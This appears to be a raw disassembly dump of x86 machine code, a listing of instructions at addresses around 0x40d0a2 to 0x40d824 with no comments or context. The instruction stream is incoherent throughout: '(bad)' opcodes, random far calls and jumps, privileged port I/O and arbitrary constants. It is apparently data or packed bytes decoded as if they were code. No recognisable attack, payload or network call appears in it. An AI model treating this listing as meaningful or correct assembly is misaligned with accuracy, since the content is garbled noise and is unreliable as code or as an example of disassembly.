  40d0a2:	fdivr  st,st(5)
  40d0a4:	retf   0x56df
  40d0a7:	inc    esi
  40d0a8:	std    
  40d0a9:	push   esp
  40d0aa:	xor    DWORD PTR [ebx],0x5c
  40d0ad:	loop   0x40d127
  40d0af:	int3   
  40d0b0:	test   al,0x2b
  40d0b2:	pop    eax
  40d0b3:	adc    eax,0x31f7993
  40d0b8:	bound  ebp,QWORD PTR [ebx+ecx*8+0x7f]
  40d0bc:	mov    esi,0x68d53ed9
  40d0c1:	outs   dx,DWORD PTR ds:[esi]
  40d0c2:	test   al,0x8d
  40d0c4:	push   esi
  40d0c5:	inc    ecx
  40d0c6:	call   0x81bb:0x8a3de162
  40d0cd:	pushf  
  40d0ce:	pop    ds
  40d0cf:	test   DWORD PTR [edx],ebx
  40d0d1:	dec    eax
  40d0d2:	in     eax,dx
  40d0d3:	xchg   ebx,eax
  40d0d4:	pop    ebx
  40d0d5:	ror    dh,0xa0
  40d0d8:	imul   eax,DWORD PTR [edx+0x6e],0xffffff95
  40d0dc:	add    DWORD PTR [ebx],ecx
  40d0de:	mov    edi,0x1df909cd
  40d0e3:	std    
  40d0e4:	aam    0x21
  40d0e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d0e7:	shl    BYTE PTR [edi+0x35],0x6b
  40d0eb:	xchg   ecx,eax
  40d0ec:	add    al,0xfc
  40d0ee:	and    al,0x84
  40d0f0:	scas   al,BYTE PTR es:[edi]
  40d0f1:	or     ah,BYTE PTR [ecx+0x982ac52]
  40d0f7:	mov    cl,0xdc
  40d0f9:	push   edi
  40d0fa:	mov    edx,0xf7e7af16
  40d0ff:	retf   0x300d
  40d102:	mov    ds:0x808cf9a1,eax
  40d107:	sub    ecx,DWORD PTR [ecx+0x512aeda]
  40d10d:	mov    dh,0x62
  40d10f:	mov    ds:0x2ebef38e,eax
  40d114:	sub    dh,BYTE PTR ds:0x933b693
  40d11a:	test   eax,0x2d19390c
  40d11f:	test   dh,0x60
  40d122:	shl    BYTE PTR [eax],0x10
  40d125:	cmp    ah,cl
  40d127:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d128:	fisttp DWORD PTR [ecx+0x11]
  40d12b:	jb     0x40d11a
  40d12d:	imul   ecx,DWORD PTR [esi*8+0x4801b52d],0xa3fd3cb8
  40d138:	xchg   edx,eax
  40d139:	rcl    DWORD PTR [ebx+0x16],1
  40d13c:	cmp    al,0x9f
  40d13e:	gs lods al,BYTE PTR fs:[esi]
  40d141:	pushf  
  40d142:	out    dx,al
  40d143:	ss mov bl,0x53
  40d146:	dec    eax
  40d147:	(bad)  
  40d148:	test   eax,0xbf419291
  40d14d:	xchg   ebp,eax
  40d14e:	js     0x40d1ce
  40d150:	push   eax
  40d151:	mov    bh,0x31
  40d153:	pop    es
  40d154:	and    DWORD PTR [eax-0x33],edi
  40d157:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d158:	jle    0x40d142
  40d15a:	outs   dx,DWORD PTR ds:[esi]
  40d15b:	fwait
  40d15c:	mov    bl,0xce
  40d15e:	ss icebp 
  40d160:	jns    0x40d1a0
  40d162:	xor    bh,BYTE PTR ds:0xc28456cb
  40d168:	pop    edi
  40d169:	and    esi,DWORD PTR [edi+esi*4+0x211e31ef]
  40d170:	pop    esi
  40d171:	mov    ds:0xc70153e6,al
  40d176:	dec    edi
  40d177:	in     al,0x17
  40d179:	sub    eax,DWORD PTR [edi-0x64aa56e2]
  40d17f:	mov    edx,0x32834191
  40d184:	loope  0x40d1f1
  40d186:	aaa    
  40d187:	mov    eax,ds:0xb7d4c27c
  40d18c:	sub    dl,BYTE PTR [edx+0x41]
  40d18f:	data16 mov ch,0x70
  40d192:	sub    eax,0x8be62ff
  40d197:	lea    esp,[esi+0xb]
  40d19a:	or     ch,bl
  40d19c:	jbe    0x40d12a
  40d19e:	push   0xac274768
  40d1a3:	mov    ch,0x5a
  40d1a5:	xchg   ebx,eax
  40d1a6:	add    eax,0x8e304c48
  40d1ab:	push   ecx
  40d1ac:	nop
  40d1ad:	test   dl,ah
  40d1af:	clc    
  40d1b0:	ja     0x40d165
  40d1b2:	stc    
  40d1b3:	sbb    DWORD PTR [esi-0x61],edi
  40d1b6:	jmp    0xc74bbd66
  40d1bb:	add    cl,BYTE PTR [edx]
  40d1bd:	pop    es
  40d1be:	call   0xf0c8:0xb0f62c52
  40d1c5:	leave  
  40d1c6:	dec    esi
  40d1c7:	les    esp,FWORD PTR [ebp+0x63]
  40d1ca:	and    ebp,eax
  40d1cc:	aam    0x98
  40d1ce:	mov    ebp,DWORD PTR [eax-0x2e8b42db]
  40d1d4:	cmp    al,0xb0
  40d1d6:	mov    ah,0xbc
  40d1d8:	retf   0x9608
  40d1db:	loop   0x40d1d9
  40d1dd:	pop    ebx
  40d1de:	xchg   esi,eax
  40d1df:	aaa    
  40d1e0:	out    0xb,eax
  40d1e2:	lods   eax,DWORD PTR ds:[esi]
  40d1e3:	in     eax,dx
  40d1e4:	inc    ebx
  40d1e5:	add    BYTE PTR [edi+0x8527a6f],bl
  40d1eb:	cld    
  40d1ec:	pop    eax
  40d1ed:	js     0x40d1c5
  40d1ef:	cmp    eax,0x3cd16e65
  40d1f4:	shl    bl,cl
  40d1f6:	in     eax,0x4c
  40d1f8:	adc    ebx,DWORD PTR [eax+ecx*8]
  40d1fb:	jmp    0x40d1f6
  40d1fd:	repz push edx
  40d1ff:	fidivr DWORD PTR [ecx-0xd]
  40d202:	nop
  40d203:	cmp    edi,ebx
  40d205:	rcl    BYTE PTR [edx-0xf],0xf6
  40d209:	retf   
  40d20a:	mov    eax,ds:0xef4befa6
  40d20f:	std    
  40d210:	ret    
  40d211:	jl     0x40d245
  40d213:	stc    
  40d214:	mov    bh,0x8a
  40d216:	retf   
  40d217:	jl     0x40d1aa
  40d219:	jmp    DWORD PTR [edx]
  40d21b:	aas    
  40d21c:	repnz setg dh
  40d220:	fidivr DWORD PTR [ecx+ecx*1]
  40d223:	sbb    eax,DWORD PTR [ebp+eax*1+0x1cc89e64]
  40d22a:	shl    DWORD PTR [eax],0xf4
  40d22d:	mov    ecx,0x9bf7207f
  40d232:	pop    es
  40d233:	imul   ebp,DWORD PTR [esp+ebp*8-0x10],0xf9c81d7f
  40d23b:	inc    ecx
  40d23c:	and    al,0xad
  40d23e:	nop
  40d23f:	imul   esp,DWORD PTR [ebp+edi*8-0x3e59b999],0xa5635ef8
  40d24a:	push   ss
  40d24b:	mov    BYTE PTR [ebx-0x34],dl
  40d24e:	aas    
  40d24f:	fimul  DWORD PTR [eax-0x7e28f2d6]
  40d255:	add    esp,DWORD PTR [ebx+eiz*1+0x31]
  40d259:	adc    DWORD PTR [esi-0x7c46937b],esp
  40d25f:	fisttp WORD PTR [esi+0x52]
  40d262:	jmp    0x40d28b
  40d264:	pop    edx
  40d265:	jmp    0x9871c084
  40d26a:	xor    al,0x20
  40d26c:	retf   0xe514
  40d26f:	mov    eax,0x91d3e4b0
  40d274:	adc    DWORD PTR [ecx+edi*1-0x49d2199],eax
  40d27b:	add    DWORD PTR [ecx+0x79],0x3d5c837b
  40d282:	es popa 
  40d284:	(bad)  
  40d285:	jg     0x40d2fd
  40d287:	and    ah,BYTE PTR [ebx-0x7c]
  40d28a:	test   DWORD PTR [edx+0x58ce8f0a],eax
  40d290:	gs cmp dh,dh
  40d293:	mov    ?,WORD PTR [ebx+0x1c]
  40d296:	es scas eax,DWORD PTR es:[edi]
  40d298:	adc    BYTE PTR [edx-0x44],0x81
  40d29c:	sbb    ch,BYTE PTR [edx-0x71]
  40d29f:	xchg   ebp,eax
  40d2a0:	sub    al,0xfa
  40d2a2:	clc    
  40d2a3:	push   cs
  40d2a4:	pusha  
  40d2a5:	cmp    eax,0x68161aa3
  40d2aa:	pop    ebp
  40d2ab:	pop    ds
  40d2ac:	pop    ecx
  40d2ad:	loopne 0x40d2c1
  40d2af:	ss mov esi,0x58e49a5e
  40d2b5:	inc    esi
  40d2b6:	push   ebp
  40d2b7:	out    dx,al
  40d2b8:	mov    eax,0x3b22c78
  40d2bd:	pop    edi
  40d2be:	jno    0x40d2b5
  40d2c0:	fidivr DWORD PTR [eax+0x77]
  40d2c3:	sbb    BYTE PTR ds:0xa400dd25,al
  40d2c9:	inc    edi
  40d2ca:	retf   0xa008
  40d2cd:	mov    al,ds:0x823796a2
  40d2d2:	xchg   esi,eax
  40d2d3:	cmp    al,0x59
  40d2d5:	outs   dx,BYTE PTR ds:[esi]
  40d2d6:	pop    esp
  40d2d7:	addr16 adc al,0x7c
  40d2da:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  40d2dc:	rcr    cl,1
  40d2de:	retfw  0x3efa
  40d2e2:	xor    ebx,ecx
  40d2e4:	pop    ds
  40d2e5:	ins    DWORD PTR es:[edi],dx
  40d2e6:	inc    eax
  40d2e7:	test   BYTE PTR [edi-0xb74279e],ch
  40d2ed:	sub    bl,BYTE PTR [esi+0x6c]
  40d2f0:	(bad)
  40d2f3:	iret   
  40d2f4:	adc    DWORD PTR ds:0xb084c6ce,ebx
  40d2fa:	jmp    0x73561312
  40d2ff:	add    edx,esi
  40d301:	and    BYTE PTR [eax],bh
  40d303:	out    0xd1,eax
  40d305:	lock scas eax,DWORD PTR es:[edi]
  40d307:	ins    DWORD PTR es:[edi],dx
  40d308:	lods   eax,DWORD PTR ds:[esi]
  40d309:	jnp    0x40d33c
  40d30b:	push   ebx
  40d30c:	rcl    DWORD PTR [edi-0x2],0x42
  40d310:	xor    edi,ecx
  40d312:	push   cs
  40d313:	ins    BYTE PTR es:[edi],dx
  40d314:	add    eax,0xb8eb180e
  40d319:	inc    ebp
  40d31a:	dec    ebx
  40d31b:	inc    esp
  40d31c:	jnp    0x40d398
  40d31e:	push   esi
  40d31f:	out    dx,al
  40d320:	jbe    0x40d2c5
  40d322:	mov    eax,ds:0xb198cda4
  40d327:	out    0xa1,eax
  40d329:	adc    eax,0x801ee246
  40d32e:	dec    edi
  40d32f:	push   ebp
  40d330:	jno    0x40d328
  40d332:	neg    dh
  40d334:	mov    WORD PTR [ecx],ds
  40d336:	(bad)
  40d339:	jo     0x40d350
  40d33b:	jmp    0x65b6:0x6cb4589c
  40d342:	jmp    0x40d39f
  40d344:	fld    st(6)
  40d346:	pusha  
  40d347:	jp     0x40d3a7
  40d349:	push   esp
  40d34a:	cli    
  40d34b:	or     BYTE PTR [ebx+0x525409d0],0x43
  40d352:	ds xchg edi,eax
  40d354:	and    DWORD PTR gs:[esp+esi*8-0x3d2005fc],edx
  40d35c:	mov    ebx,ds
  40d35e:	or     cl,BYTE PTR [edi+0x36]
  40d361:	popa   
  40d362:	jb     0x40d3cd
  40d364:	adc    edx,ebp
  40d366:	dec    ebp
  40d367:	pop    ebx
  40d368:	cmc    
  40d369:	rcr    DWORD PTR [eax+0x74],cl
  40d36c:	into   
  40d36d:	inc    edi
  40d36e:	leave  
  40d36f:	scas   eax,DWORD PTR es:[edi]
  40d370:	and    edi,DWORD PTR [esi]
  40d372:	xchg   edx,eax
  40d373:	add    BYTE PTR [ecx],ah
  40d375:	hlt    
  40d376:	jns    0x40d32e
  40d378:	ins    BYTE PTR es:[edi],dx
  40d379:	pop    ds
  40d37a:	push   es
  40d37b:	popa   
  40d37c:	mov    edi,0xaa562db1
  40d381:	push   0x67115ed
  40d386:	stos   DWORD PTR es:[edi],eax
  40d387:	(bad)  
  40d388:	or     eax,0x15373cd8
  40d38d:	cmp    al,bh
  40d38f:	ja     0x40d3c1
  40d391:	mov    WORD PTR [eax-0x6d],ss
  40d394:	mov    dl,0x3d
  40d396:	add    eax,0x8f4ecbba
  40d39b:	popa   
  40d39c:	cdq    
  40d39d:	jg     0x40d3bc
  40d39f:	inc    ecx
  40d3a0:	aam    0x6
  40d3a2:	xchg   BYTE PTR [esi-0x34],dl
  40d3a5:	jno    0x40d425
  40d3a7:	inc    edi
  40d3a8:	push   edi
  40d3a9:	and    eax,0x44756b3e
  40d3ae:	push   cs
  40d3af:	xlat   BYTE PTR ds:[ebx]
  40d3b0:	iret   
  40d3b1:	jg     0x40d430
  40d3b3:	jp     0x40d36b
  40d3b5:	stc    
  40d3b6:	mov    ecx,0xaa6d3353
  40d3bb:	push   0x60
  40d3bd:	adc    DWORD PTR [edx+0x13],ecx
  40d3c0:	(bad)  
  40d3c1:	mov    dh,0x66
  40d3c4:	dec    esi
  40d3c5:	add    eax,0xe00b5110
  40d3ca:	push   cs
  40d3cb:	xor    ah,dl
  40d3cd:	xor    bh,0x3c
  40d3d0:	cli    
  40d3d1:	(bad)
  40d3d4:	out    0xcb,al
  40d3d6:	das    
  40d3d7:	pop    ss
  40d3d8:	loope  0x40d3ad
  40d3da:	or     edi,DWORD PTR [edx-0x1734e305]
  40d3e0:	into   
  40d3e1:	outs   dx,DWORD PTR ds:[esi]
  40d3e2:	stos   BYTE PTR es:[edi],al
  40d3e3:	scas   al,BYTE PTR es:[edi]
  40d3e4:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  40d3e6:	sbb    DWORD PTR [esp+edx*1],ebx
  40d3e9:	jecxz  0x40d443
  40d3eb:	je     0x40d3f0
  40d3ed:	xor    dl,ah
  40d3ef:	imul   esi,DWORD PTR [edx+edx*8-0xd],0x67c41d56
  40d3f7:	(bad)  [edi]
  40d3f9:	dec    eax
  40d3fa:	nop
  40d3fb:	jl     0x40d416
  40d3fd:	xchg   ebx,eax
  40d3fe:	push   esp
  40d3ff:	rol    BYTE PTR ds:0x2c7d189a,cl
  40d405:	dec    edi
  40d406:	in     eax,0x7d
  40d408:	and    bl,BYTE PTR [ebx+edi*8-0x6009c72e]
  40d40f:	jge    0x40d419
  40d411:	dec    edi
  40d412:	mov    WORD PTR [edi+0xd],?
  40d415:	call   0xe192e553
  40d41a:	icebp  
  40d41b:	cmp    dh,ah
  40d41d:	cs stos DWORD PTR es:[edi],eax
  40d41f:	jbe    0x40d3a4
  40d421:	js     0x40d3b9
  40d423:	dec    esi
  40d424:	test   al,0x4a
  40d426:	add    bl,bh
  40d428:	cmp    edi,DWORD PTR [eax-0x4e7dad18]
  40d42e:	cwde   
  40d42f:	add    eax,0xbe8ea9e1
  40d434:	cdq    
  40d435:	sbb    eax,0xa829aab6
  40d43a:	or     al,0xd4
  40d43c:	xchg   ecx,eax
  40d43d:	shl    dh,1
  40d43f:	out    dx,al
  40d440:	xor    edi,DWORD PTR [eax+0x1c]
  40d443:	enter  0x8875,0x26
  40d447:	cwde   
  40d448:	or     DWORD PTR [ebx-0x4cb7e769],ebx
  40d44e:	outs   dx,DWORD PTR ds:[esi]
  40d44f:	cmp    dh,BYTE PTR [eax-0x50a3094f]
  40d455:	or     esp,DWORD PTR [esi+edi*1+0x3bd7246d]
  40d45c:	jb     0x40d48e
  40d45e:	out    0x75,eax
  40d460:	sbb    BYTE PTR [esi-0x7557c2ad],ch
  40d466:	aaa    
  40d467:	int3   
  40d468:	push   esi
  40d469:	test   BYTE PTR [ebp+0x5e0268c8],0xaa
  40d470:	push   ebx
  40d471:	xchg   BYTE PTR [esi-0x36],cl
  40d474:	cli    
  40d475:	pop    edx
  40d476:	pop    eax
  40d477:	add    esi,esp
  40d479:	pop    esp
  40d47a:	fimul  WORD PTR [edi+0xcdbe462]
  40d480:	add    esp,ebx
  40d482:	call   0x7d2d92c3
  40d487:	sub    eax,0xe2628034
  40d48c:	inc    edi
  40d48d:	repnz and cl,BYTE PTR [eax-0x4c]
  40d491:	cli    
  40d492:	daa    
  40d493:	fnstsw WORD PTR [esi+0x52d98cc9]
  40d499:	xlat   BYTE PTR ds:[ebx]
  40d49a:	ret    0x7421
  40d49d:	pop    ss
  40d49e:	mov    WORD PTR [edx+0x38],ss
  40d4a1:	dec    esi
  40d4a2:	xor    ecx,DWORD PTR [esi-0x2ea9df4c]
  40d4a8:	pushf  
  40d4a9:	stos   BYTE PTR es:[edi],al
  40d4aa:	jp     0x40d468
  40d4ac:	ins    BYTE PTR es:[edi],dx
  40d4ad:	push   es
  40d4ae:	std    
  40d4af:	out    dx,al
  40d4b0:	loope  0x40d50e
  40d4b2:	mov    esp,0x10015af0
  40d4b7:	xchg   ebp,eax
  40d4b8:	loopne 0x40d4d7
  40d4ba:	sbb    ah,BYTE PTR [esi+0x50]
  40d4bd:	call   0x78a1d5fa
  40d4c2:	sbb    eax,DWORD PTR [edx]
  40d4c4:	mov    esi,0xd8b6f454
  40d4c9:	or     edi,0x128cb6c1
  40d4cf:	iret   
  40d4d0:	jmp    0x96bd10be
  40d4d5:	stos   BYTE PTR es:[edi],al
  40d4d6:	daa    
  40d4d7:	test   eax,0xb706ba4b
  40d4dc:	sar    BYTE PTR [edi+0x683e6992],1
  40d4e2:	ja     0x40d471
  40d4e4:	ins    DWORD PTR es:[edi],dx
  40d4e5:	test   BYTE PTR [ecx],bl
  40d4e7:	mov    esp,0xd0e864e1
  40d4ec:	lock mov bl,0x38
  40d4ef:	xchg   BYTE PTR [ecx],cl
  40d4f1:	add    eax,0x84451482
  40d4f7:	lods   eax,DWORD PTR ds:[esi]
  40d4f8:	out    dx,eax
  40d4f9:	or     DWORD PTR [edi+edx*8+0x34],ecx
  40d4fd:	add    bl,BYTE PTR [eax+0x2b]
  40d500:	sti    
  40d501:	test   DWORD PTR [esi],ebp
  40d503:	jae    0x40d551
  40d505:	xor    al,0xa0
  40d507:	jnp    0x40d503
  40d509:	cmp    ebp,ebx
  40d50b:	xlat   BYTE PTR ds:[ebx]
  40d50c:	stc    
  40d50d:	xor    DWORD PTR [edi+edx*4+0x68],ebp
  40d511:	fidiv  WORD PTR [esi]
  40d513:	fisub  DWORD PTR [ebp+0x6]
  40d516:	mov    ecx,0xc245dfbb
  40d51b:	daa    
  40d51c:	mov    gs,WORD PTR [bx-0x79e]
  40d521:	add    ebx,ebp
  40d523:	out    0x16,al
  40d525:	int3   
  40d526:	mov    esp,0x358e0e80
  40d52b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d52c:	stos   DWORD PTR es:[edi],eax
  40d52d:	push   0xffffffea
  40d52f:	and    eax,0xd2f63065
  40d534:	xor    DWORD PTR [edx+0x21d2ee94],0x8b98e419
  40d53e:	cmc    
  40d53f:	stos   BYTE PTR es:[edi],al
  40d540:	inc    ebp
  40d541:	repnz out 0xc9,eax
  40d544:	rcr    BYTE PTR [edi+edi*2+0x21850329],0xa2
  40d54c:	xchg   ebp,eax
  40d54d:	xor    ebx,0x3380f95
  40d553:	jle    0x40d545
  40d555:	add    al,0xe5
  40d557:	and    eax,0xea01169c
  40d55c:	adc    BYTE PTR [edx-0x78],dl
  40d55f:	loopne 0x40d56a
  40d561:	xchg   ecx,eax
  40d562:	jmp    0x9efc48dc
  40d567:	add    eax,0xa484e5b0
  40d56c:	inc    esp
  40d56d:	sbb    BYTE PTR [ebp-0x3eaa6ce3],dh
  40d573:	cld    
  40d574:	(bad)  
  40d575:	xlat   BYTE PTR ds:[ebx]
  40d576:	retf   
  40d577:	adc    edi,edx
  40d579:	mov    bl,0x83
  40d57b:	sub    edi,DWORD PTR [eax-0x61]
  40d57e:	(bad)  
  40d57f:	cs xchg edx,eax
  40d581:	mov    esi,0x2907ec76
  40d586:	enter  0xa1a4,0x62
  40d58a:	mov    fs,WORD PTR [edx]
  40d58c:	imul   ebp,eax,0xffffff84
  40d58f:	neg    ah
  40d591:	xor    BYTE PTR [eax],bh
  40d593:	sub    BYTE PTR [edx+edx*1-0x3c],ah
  40d597:	addr16 add dh,dh
  40d59a:	push   cs
  40d59b:	mov    esp,0x81d8207
  40d5a0:	sub    al,0xc9
  40d5a2:	clc    
  40d5a3:	test   eax,0x8bbf0351
  40d5a8:	or     ebx,DWORD PTR [ebp-0x4a181227]
  40d5ae:	clc    
  40d5af:	std    
  40d5b0:	das    
  40d5b1:	push   ss
  40d5b2:	pop    ss
  40d5b3:	xchg   esi,eax
  40d5b4:	in     al,dx
  40d5b5:	and    al,0x53
  40d5b7:	and    BYTE PTR [edx],al
  40d5b9:	ins    DWORD PTR es:[edi],dx
  40d5ba:	stc    
  40d5bb:	scas   eax,DWORD PTR es:[edi]
  40d5bc:	test   al,0x1f
  40d5be:	pop    ebp
  40d5bf:	or     al,0xc6
  40d5c1:	jmp    ecx
  40d5c3:	popf   
  40d5c4:	add    BYTE PTR [ecx-0x59],dh
  40d5c7:	(bad)  
  40d5c8:	cdq    
  40d5c9:	push   cs
  40d5ca:	cmp    esi,DWORD PTR ds:0x8f5fdb0f
  40d5d0:	cld    
  40d5d1:	mov    al,ds:0x3fcc5713
  40d5d6:	dec    esi
  40d5d7:	test   ch,0x72
  40d5da:	ss add eax,eax
  40d5dd:	inc    ebp
  40d5de:	loope  0x40d5da
  40d5e0:	fstp   QWORD PTR [edi]
  40d5e2:	push   ss
  40d5e3:	out    dx,eax
  40d5e4:	shl    BYTE PTR [eax+0x11957af9],1
  40d5ea:	test   eax,0xa4863a07
  40d5ef:	and    eax,0x156dcedb
  40d5f4:	push   ss
  40d5f5:	pop    edi
  40d5f6:	push   es
  40d5f7:	inc    ebx
  40d5f8:	add    DWORD PTR [ebp+eax*4-0x3d],esp
  40d5fc:	div    BYTE PTR [ecx-0x39]
  40d5ff:	js     0x40d641
  40d601:	adc    eax,0xbdc91723
  40d606:	add    DWORD PTR [ebp+ecx*4-0x62b0f520],esp
  40d60d:	push   cs
  40d60e:	daa    
  40d60f:	sbb    bl,cl
  40d611:	add    DWORD PTR [esi-0x21],0xffffff9f
  40d615:	mov    cl,0xe1
  40d617:	mov    ds,WORD PTR [ecx]
  40d619:	repnz es xor eax,0xcf793a30
  40d620:	pop    ss
  40d621:	cmp    DWORD PTR [edi+0x329dd061],eax
  40d627:	adc    eax,0x9c1d99fe
  40d62c:	inc    edi
  40d62d:	add    BYTE PTR [ebx-0x80],al
  40d630:	repz clc 
  40d632:	bound  ecx,QWORD PTR [ecx+0x5a13b3bc]
  40d638:	pusha  
  40d639:	mov    dh,bh
  40d63b:	adc    esp,DWORD PTR [edi-0x42]
  40d63e:	enter  0x4f02,0x3f
  40d642:	sbb    dl,BYTE PTR [ecx+0x3b]
  40d645:	xchg   ebx,eax
  40d646:	xor    DWORD PTR [eax-0x37c9ba6e],eax
  40d64c:	(bad)
  40d64f:	push   es
  40d650:	js     0x40d621
  40d652:	mov    esi,0x1d9f5fa4
  40d657:	inc    eax
  40d658:	sub    cl,cl
  40d65a:	xchg   esi,ebp
  40d65c:	in     al,dx
  40d65d:	sub    edx,esi
  40d65f:	sbb    bh,dl
  40d661:	push   0x14
  40d663:	inc    edi
  40d664:	cmc    
  40d665:	test   cl,bh
  40d667:	cmp    DWORD PTR [ebx],esi
  40d669:	es test eax,0x409d9c48
  40d66f:	xchg   edx,eax
  40d670:	xchg   edi,eax
  40d671:	inc    BYTE PTR [esi]
  40d673:	sbb    al,0xf8
  40d675:	xor    DWORD PTR [bp+di-0xa],ebp
  40d679:	ror    DWORD PTR [esi],0xdc
  40d67c:	fnstenv [esi-0xb]
  40d67f:	dec    esp
  40d680:	inc    ecx
  40d681:	ret    0x36b
  40d684:	mov    BYTE PTR [edx-0x58],ch
  40d687:	(bad)  
  40d688:	out    dx,al
  40d689:	fwait
  40d68a:	pop    edx
  40d68b:	xchg   ecx,eax
  40d68c:	push   es
  40d68d:	cmp    BYTE PTR [ecx+0x4f],dl
  40d690:	inc    esp
  40d691:	inc    esp
  40d692:	popf   
  40d693:	mov    ch,0xc2
  40d695:	imul   edi,esp,0xebc57249
  40d69b:	cmovae ebp,DWORD PTR [edi-0x64]
  40d69f:	pop    edx
  40d6a0:	sar    bh,cl
  40d6a2:	je     0x40d67b
  40d6a4:	call   0xb800:0x24fa6430
  40d6ab:	dec    edx
  40d6ac:	mov    cl,0x48
  40d6ae:	aas    
  40d6af:	pushf  
  40d6b0:	mov    WORD PTR [edi],es
  40d6b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d6b3:	cli    
  40d6b4:	test   DWORD PTR [ebp*8-0x1c591e6b],esi
  40d6bb:	lock fdivr DWORD PTR [ecx+0x4d73b0e0]
  40d6c2:	jo     0x40d695
  40d6c4:	retf   
  40d6c5:	dec    eax
  40d6c6:	sub    al,0xa0
  40d6c8:	jb     0x40d6d6
  40d6ca:	jge    0x40d741
  40d6cc:	cdq    
  40d6cd:	push   eax
  40d6ce:	or     eax,0xb5b8b033
  40d6d3:	popf   
  40d6d4:	mov    bh,0x8a
  40d6d6:	mov    ch,0xd8
  40d6d8:	stos   BYTE PTR es:[edi],al
  40d6d9:	test   eax,0xc0ba6800
  40d6de:	push   ss
  40d6df:	mov    eax,0xd748aa9c
  40d6e4:	pop    edi
  40d6e5:	outs   dx,BYTE PTR ds:[esi]
  40d6e6:	ja     0x40d726
  40d6e8:	int    0x63
  40d6ea:	ja     0x40d6ad
  40d6ec:	fcmovbe st,st(4)
  40d6ee:	int    0x9e
  40d6f0:	in     al,0x56
  40d6f2:	outs   dx,BYTE PTR ds:[esi]
  40d6f3:	shl    DWORD PTR [edi-0x46],cl
  40d6f6:	shr    BYTE PTR [edi+0x7ea67baa],1
  40d6fc:	inc    edi
  40d6fd:	bound  ebp,QWORD PTR [edi+0x8]
  40d700:	ficomp DWORD PTR [edi+0x59]
  40d703:	imul   ebp,DWORD PTR [eax+ebx*2-0xc],0x105323a0
  40d70b:	stc    
  40d70c:	popa   
  40d70d:	mov    bh,0x9d
  40d70f:	cmp    edx,ebx
  40d711:	arpl   WORD PTR [eax+0x5ed86af6],di
  40d717:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d718:	lods   al,BYTE PTR ds:[esi]
  40d719:	jge    0x40d758
  40d71b:	push   ss
  40d71c:	xlat   BYTE PTR ds:[ebx]
  40d71d:	lods   eax,DWORD PTR ds:[esi]
  40d71e:	and    DWORD PTR [eax-0x13],edi
  40d721:	leave  
  40d722:	or     ebp,ebx
  40d724:	mov    BYTE PTR [edx+ecx*2],bl
  40d727:	mov    cs,WORD PTR [ebx-0x65]
  40d72a:	add    BYTE PTR [edx-0x5b990236],dl
  40d730:	dec    ebx
  40d731:	fcomp  QWORD PTR [ebp-0x43e94492]
  40d737:	arpl   WORD PTR [edi+0x6a6f666f],cx
  40d73d:	imul   cl
  40d73f:	sbb    BYTE PTR [edi+edi*2],al
  40d742:	pop    ds
  40d743:	push   cs
  40d744:	lods   eax,DWORD PTR ds:[esi]
  40d745:	or     al,0x44
  40d747:	aam    0x90
  40d749:	test   DWORD PTR [esp+edx*1+0x5],ecx
  40d74d:	pop    ebx
  40d74e:	inc    esi
  40d74f:	mov    ds:0xaf6ade4e,al
  40d754:	mov    dh,0xe5
  40d756:	jno    0x40d76d
  40d758:	cdq    
  40d759:	fdiv   st,st(2)
  40d75b:	mov    edi,0x6a713aac
  40d760:	xchg   edi,eax
  40d761:	fld    TBYTE PTR [eax-0x75]
  40d764:	jmp    0x40d722
  40d766:	mov    edi,0x2aff10c
  40d76b:	xchg   ecx,eax
  40d76c:	add    esi,esi
  40d76e:	pop    edi
  40d76f:	mov    edx,0xb631b225
  40d774:	mov    dh,BYTE PTR [esi-0x441ba77e]
  40d77a:	in     eax,dx
  40d77b:	mov    al,ds:0xf915f111
  40d780:	jo     0x40d797
  40d782:	loop   0x40d773
  40d784:	nop
  40d785:	sub    bl,bh
  40d787:	jecxz  0x40d7db
  40d789:	test   eax,0xa0993b3c
  40d78e:	dec    esi
  40d78f:	pop    es
  40d790:	inc    ecx
  40d791:	inc    esi
  40d792:	fwait
  40d793:	repnz xor al,0x67
  40d796:	sbb    al,0x1
  40d798:	jne    0x40d76d
  40d79a:	outs   dx,BYTE PTR ds:[esi]
  40d79b:	sbb    ebx,eax
  40d79d:	ja     0x40d76d
  40d79f:	adc    eax,0x43702784
  40d7a4:	js     0x40d732
  40d7a6:	xor    bh,BYTE PTR [esi+0x31]
  40d7a9:	adc    BYTE PTR [ebx+0x43],0xb7
  40d7ad:	outs   dx,BYTE PTR ds:[esi]
  40d7ae:	mov    ecx,0x417869e6
  40d7b3:	int3   
  40d7b4:	inc    edx
  40d7b6:	xor    eax,0xe28c89ab
  40d7bb:	pop    es
  40d7bc:	or     edx,0x30f482fe
  40d7c2:	inc    ebx
  40d7c3:	out    dx,al
  40d7c4:	cdq    
  40d7c5:	pmullw mm3,mm6
  40d7c8:	inc    eax
  40d7c9:	add    eax,0x4e80817e
  40d7ce:	data16 or ch,cl
  40d7d1:	test   al,0x12
  40d7d3:	xor    edx,DWORD PTR [edx+0x48d9c75e]
  40d7d9:	push   cs
  40d7da:	sar    DWORD PTR [ebx],cl
  40d7dc:	pop    esp
  40d7dd:	inc    ebx
  40d7de:	fs add eax,0x6809dc3f
  40d7e4:	dec    esi
  40d7e5:	shl    BYTE PTR [ebx+0x4e44ece],0xd2
  40d7ec:	mov    ch,0xef
  40d7ee:	dec    ebp
  40d7ef:	fisubr DWORD PTR [ecx-0x69fbfcbb]
  40d7f5:	mov    dl,0xd8
  40d7f7:	xor    al,0x6
  40d7f9:	ins    DWORD PTR es:[edi],dx
  40d7fa:	fs pusha 
  40d7fc:	push   ebp
  40d7fd:	inc    ecx
  40d7fe:	out    0x6f,al
  40d800:	inc    eax
  40d801:	sahf   
  40d802:	or     cl,0x48
  40d805:	fist   WORD PTR [ebp+0x333e1b12]
  40d80b:	out    dx,eax
  40d80c:	mov    ds:0xe0859324,al
  40d811:	lods   al,BYTE PTR ds:[esi]
  40d812:	and    bh,BYTE PTR [edi-0x79d2465b]
  40d818:	hlt    
  40d819:	mov    cs,WORD PTR [edi+0x18dba0f]
  40d81f:	xchg   ebp,eax
  40d820:	push   ebx
  40d821:	ret    0xa970
  40d824:	xchg   esi,eax
